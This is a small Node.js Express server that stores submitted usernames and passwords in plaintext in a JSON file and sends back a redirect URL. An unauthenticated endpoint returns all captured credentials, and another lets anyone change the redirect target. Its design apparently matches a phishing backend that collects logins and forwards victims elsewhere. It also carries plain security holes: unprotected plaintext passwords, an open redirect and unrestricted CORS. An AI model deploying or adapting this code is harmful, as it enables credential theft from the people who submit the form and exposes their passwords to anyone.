const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// File paths
const DATA_FILE = './submissions.json';
const CONFIG_FILE = './config.json';

// Ensure files exist
if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, JSON.stringify([]));
if (!fs.existsSync(CONFIG_FILE)) fs.writeFileSync(CONFIG_FILE, JSON.stringify({ redirectUrl: '/thankyou.html' }));

// Get submissions
app.get('/api/submissions', (req, res) => {
  const submissions = JSON.parse(fs.readFileSync(DATA_FILE));
  res.json(submissions);
});

// Submit form
app.post('/api/submit', (req, res) => {
  const { username, password } = req.body;

  if (username && password) {
    const submissions = JSON.parse(fs.readFileSync(DATA_FILE));
    submissions.push({ username, password, timestamp: new Date().toISOString() });
    fs.writeFileSync(DATA_FILE, JSON.stringify(submissions));
    const config = JSON.parse(fs.readFileSync(CONFIG_FILE));
    res.json({ message: 'Submission successful', redirectUrl: config.redirectUrl });
  } else {
    res.status(400).json({ message: 'Invalid input' });
  }
});

// Update redirect URL
app.post('/api/config/redirect', (req, res) => {
  const { redirectUrl } = req.body;

  if (redirectUrl) {
    const config = { redirectUrl };
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(config));
    res.json({ message: 'Redirect URL updated successfully' });
  } else {
    res.status(400).json({ message: 'Invalid URL' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});